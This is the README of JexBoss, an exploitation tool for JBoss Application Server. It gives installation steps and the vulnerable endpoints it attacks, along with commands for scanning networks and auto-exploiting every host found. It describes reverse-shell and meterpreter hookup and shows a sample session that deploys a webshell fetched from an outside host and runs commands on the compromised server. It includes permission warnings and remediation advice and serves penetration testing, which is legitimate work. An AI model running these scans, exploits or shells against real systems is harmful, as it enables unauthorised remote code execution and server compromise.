JexBoss - Jboss verify and EXploitation Tool
=======

JexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Server.

Requirements
----
* Python >= 2.7.x
* [urllib3](https://pypi.python.org/pypi/urllib3)
* [ipaddress](https://pypi.python.org/pypi/ipaddress)

Installation on Linux\Mac
-------------------------
To install the latest version of JexBoss, please use the following commands:

	git clone https://github.com/joaomatosf/jexboss.git
	cd jexboss
	pip install -r requires.txt
	python jexboss.py -h
	python jexboss.py -host http://target_host:8080

	OR:

	Download the latest version at: https://github.com/joaomatosf/jexboss/archive/master.zip
	unzip master.zip
	cd jexboss-master
	pip install -r requires.txt
	python jexboss.py -h
	python jexboss.py -host http://target_host:8080


If you are using CentOS with Python 2.6, please install Python2.7.
Installation example of the Python 2.7 on CentOS using Collections Software scl:

    yum -y install centos-release-scl
    yum -y install python27
    scl enable python27 bash

Installation on Windows
-----------------------
If you are using Windows, you can use the [Git Bash](https://github.com/git-for-windows/git/releases/tag/v2.10.1.windows.1) to run the JexBoss. Follow the steps below:

* Download and install [Python](https://www.python.org/downloads/release/python-2712/)
* Download and install [Git for Windows](https://github.com/git-for-windows/git/releases/tag/v2.10.1.windows.1)
* After installing, run the Git for Windows and type the following commands:

```
    PATH=$PATH:C:\Python27\
    PATH=$PATH:C:\Python27\Scripts
    git clone https://github.com/joaomatosf/jexboss.git
    cd jexboss
    pip install -r requires.txt
    python jexboss.py -h
    python jexboss.py -host http://target_host:8080
    
```

Features
----
The tool and exploits were developed and tested for versions 3, 4, 5 and 6 of the JBoss Application Server.

The exploitation vectors are:

* /admin-console [ NEW ]
	- tested and working in JBoss versions 5 and 6
* /jmx-console
	- tested and working in JBoss versions 4, 5 and 6
* /web-console/Invoker
	- tested and working in JBoss versions 4
* /invoker/JMXInvokerServlet
	- tested and working in JBoss versions 4 and 5

Reverse Shell (meterpreter integration)
---------------------------------------
After exploit a server, you can use the own jexboss shell of commands or perform a reverse connection using the following command:
```
   jexremote=YOUR_IP:YOUR_PORT

   Example:
     Shell>jexremote=192.168.0.10:4444
```

* Example:
![alt tag](https://github.com/joaomatosf/jexboss/raw/master/screenshots/jexbossreverse.png)

Screenshots
----

* Standalone mode:
```
$ python jexboss.py -host 192.168.0.114:8080
```
![alt tag](https://github.com/joaomatosf/jexboss/raw/master/screenshots/standalone_mode.png)

* Usage modes:
```
$ python jexboss.py -h
```
![alt tag](https://github.com/joaomatosf/jexboss/raw/master/screenshots/help_usage.png)

* Network scan mode:
```
$ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080 -results results.txt
```
![alt tag](https://github.com/joaomatosf/jexboss/raw/master/screenshots/network_scan_mode.png)

* Network scan with auto-exploit mode:
```
$ python jexboss.py -mode auto-scan -A -network 192.168.0.0/24 -ports 8080 -results results.txt
```
![alt tag](https://github.com/joaomatosf/jexboss/raw/master/screenshots/scan_with_auto_exploit_mode.png)


* Results and recommendations:

![alt tag](https://github.com/joaomatosf/jexboss/raw/master/screenshots/results_and_recommendations.png)

Usage example
----
* Check the file "demo.png"

* Auto scan mode:
```
$ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080,80 -results report_auto_scan.log
```

* File scan mode:
```
$ python jexboss.py -mode file-scan -file host_list.txt -out report_file_scan.log
```

* More Options:

```
$ python jexboss.py -h

optional arguments:
  -h, --help            show this help message and exit
  --version             show program's version number and exit
  --auto-exploit, -A    Send exploit code automatically (USE ONLY IF YOU HAVE
                        PERMISSION!!!)
  --disable-check-updates, -D
                        Disable two updates checks: 1) Check for updates
                        performed by the webshell in exploited server at
                        http://webshell.jexboss.net/jsp_version.txt and 2)
                        check for updates performed by the jexboss client at
                        http://joaomatosf.com/rnp/releases.txt
  -mode {standalone,auto-scan,file-scan}
                        Operation mode
  --proxy PROXY, -P PROXY
                        Use a http proxy to connect to the target URL (eg. -P
                        http://192.168.0.1:3128)
  --proxy-cred LOGIN:PASS, -L LOGIN:PASS
                        Proxy authentication credentials (eg -L name:password)
  --jboss-login LOGIN:PASS, -J LOGIN:PASS
                        JBoss login and password for exploit admin-console in
                        JBoss 5 and JBoss 6 (default: admin:admin)
  --timeout TIMEOUT     Seconds to wait before timeout connection (default 3)

Standalone mode:
  -host HOST, -u HOST   Host address to be checked (eg. -u
                        http://192.168.0.10:8080)

Auto scan mode:
  -network NETWORK      Network to be checked in CIDR format (eg. 10.0.0.0/8)
  -ports PORTS          List of ports separated by commas to be checked for
                        each host (eg. 8080,8443,8888,80,443)
  -results FILENAME     File name to store the auto scan results

File scan mode:
  -file FILENAME_HOSTS  Filename with host list to be scanned (one host per
                        line)
  -out FILENAME_RESULTS
                        File name to store the file scan results

```

* Standalone mode:

```
* Installation via git:

$ git clone https://github.com/joaomatosf/jexboss.git
$ cd jexboss
$ python jexboss.py -host https://site-teste.com

* Or via download:

$ wget https://github.com/joaomatosf/jexboss/archive/master.zip
$ unzip master.zip
$ cd jexboss-master
$ python jexboss.py -host https://site-teste.com


 * --- JexBoss: Jboss verify and EXploitation Tool  --- *
 |                                                      |
 | @author:  João Filho Matos Figueiredo                |
 | @contact: joaomatosf@gmail.com                       |
 |                                                      |
 | @update: https://github.com/joaomatosf/jexboss       |
 #______________________________________________________#


 ** Checking Host: https://site-teste.com **

 * Checking admin-console: 	       [ EXPOSED ]
 * Checking web-console: 	       [ OK ]
 * Checking jmx-console: 	       [ VULNERABLE ]
 * Checking JMXInvokerServlet: 	   [ VULNERABLE ]


 * Do you want to try to run an automated exploitation via "jmx-console" ?
   This operation will provide a simple command shell to execute commands on the server..
   Continue only if you have permission!
   yes/NO ? yes

 * Sending exploit code to https://site-teste.com. Wait...


 * Info: This exploit will force the server to deploy the webshell
   available on: http://www.joaomatosf.com/rnp/jbossass.war
 * Successfully deployed code! Starting command shell, wait...

 * - - - - - - - - - - - - - - - - - - - - LOL - - - - - - - - - - - - - - - - - - - - *

 * https://site-teste.com:

 Linux seglinux 3.18.4-1.el6.elrepo.x86_64 #1 SMP Wed Jan 28 13:28:52 EST 2015 x86_64 x86_64 x86_64 GNU/Linux

 CentOS release 6.5 (Final)

 uid=509(jboss) gid=509(jboss) grupos=509(jboss) context=system_u:system_r:initrc_t:s0

[Type commands or "exit" to finish]
Shell> pwd
/usr/jboss-6.1.0.Final/bin

[Type commands or "exit" to finish]
Shell> hostname
fwgw

[Type commands or "exit" to finish]
Shell> ls -all /home
total 16
drwxr-xr-x.  4 root  root  4096 Jan 26  2015 .
dr-xr-xr-x. 23 root  root  4096 Mar 31 04:51 ..
-rwxrwxrwx.  1 root  root     0 Jan 26  2015 file1
-rw-r-----.  1 root  root     0 Jan 26  2015 file2
-rw-rw-r--.  1 root  root     0 Jan 26  2015 file3
drwx------.  2 joao  joao  4096 Jan 26  2015 joao
drwx------.  2 maria maria 4096 Jan 26  2015 maria

[Type commands or "exit" to finish]
Shell>exit

Results: potentially compromised server!
 * - - - - - - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*
 Recommendations:
 - Remove web consoles and services that are not used, eg:
    $ rm web-console.war
    $ rm http-invoker.sar
    $ rm jmx-console.war
    $ rm jmx-invoker-adaptor-server.sar
    $ rm admin-console.war
 - Use a reverse proxy (eg. nginx, apache, F5)
 - Limit access to the server only via reverse proxy (eg. DROP INPUT POLICY)
 - Search vestiges of exploitation within the directories "deploy" and "management".

 References:
   [1] - https://developer.jboss.org/wiki/SecureTheJmxConsole
   [2] - https://issues.jboss.org/secure/attachment/12313982/jboss-securejmx.pdf

 - If possible, discard this server!
 * - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*

 * Info: review, suggestions, updates, etc:
   https://github.com/joaomatosf/jexboss

 * DONATE: Please consider making a donation to help improve this tool,
           including research to new versions of JBoss and zero days.

 * Paypal:  joaomatosf@gmail.com
 * Bitcoin Address:  14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C
 * URI:  bitcoin:14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C?label=jexboss
```



Questions, problems, suggestions and etc:
----

* joaomatosf@gmail.com


